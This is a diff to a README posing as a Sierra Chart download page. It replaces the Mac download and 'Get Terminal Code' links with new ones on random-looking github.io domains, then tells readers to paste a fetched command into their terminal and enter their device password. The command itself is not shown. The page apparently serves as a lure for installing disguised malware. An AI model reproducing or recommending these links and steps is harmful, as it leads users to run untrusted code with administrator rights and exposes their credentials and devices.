@@ -11,7 +11,7 @@
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://sierra-chart-download.github.io/.github/) 
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/sierrachart)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/sierrachart)  
 
 </div>  
 
@@ -92,7 +92,7 @@ Used by everyone from retail traders to proprietary trading firms, Sierra Chart 
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/ZebsMr8U)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/ZebsMr8U)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
